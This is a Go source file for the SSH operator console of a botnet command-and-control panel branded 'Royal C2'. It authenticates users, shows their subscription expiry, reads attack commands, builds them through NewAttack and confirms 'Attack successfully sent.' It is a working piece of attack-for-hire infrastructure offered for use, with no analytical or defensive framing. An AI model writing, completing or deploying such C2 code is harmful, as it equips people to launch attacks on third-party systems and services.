package main

import (
	"fmt"
	"github.com/gliderlabs/ssh"
	"golang.org/x/crypto/ssh/terminal"
	"math/rand"
	"strings"
	"time"
)

type Admin struct {
	conn ssh.Session
}

func NewAdmin(ssh ssh.Session) *Admin {
	return &Admin{ssh}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
	var userInfo AccountInfo
	userInfo = database.GetAccountInfo(this.conn.User())
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		for {
			time.Sleep(time.Second)
			var expiryString = ""
			var timee = time.Until(time.Unix(int64(userInfo.expiry), 0))
			if userInfo.expiry != -1 {
				if int64(timee.Hours()) == 0 {
					expiryString = fmt.Sprintf("%dm", int64(timee.Minutes()))
				} else {
					expiryString = fmt.Sprintf("%dh %dm", int64(timee.Hours()), int64(timee.Minutes()))
				}
			} else {
				expiryString = "None"
			}
			this.SetTitle("Royal C2 | User: [" + userInfo.username + "] | Expiry: [" + expiryString + "]")
		}
	}()
	this.ClearScreen()
	for {
		term := terminal.NewTerminal(this.conn, userInfo.username+"@Royal$ ")
		cmd, err := term.ReadLine()
		cmd = strings.ToLower(cmd)
		if err != nil {
			return
		}

		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLEAR" || cmd == "CLS" {
			this.ClearScreen()
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "?" {
			continue
		}

		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" {
			return
		}
		atk, err := NewAttack(cmd)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s", err.Error())))
			} else {
				this.SendMessage("\u001B[92mAttack successfully sent.\u001B[0m", true)
			}
		}
	}
}

func (this *Admin) SendMessage(message string, newline bool) {
	if newline {
		this.conn.Write([]byte(message + "\r\n"))
	} else {
		this.conn.Write([]byte(message))
	}
}

func (this *Admin) ClearScreen() {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
}

func (this *Admin) SetTitle(message string) {
	this.conn.Write([]byte("\033]0;" + message + "\007"))
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
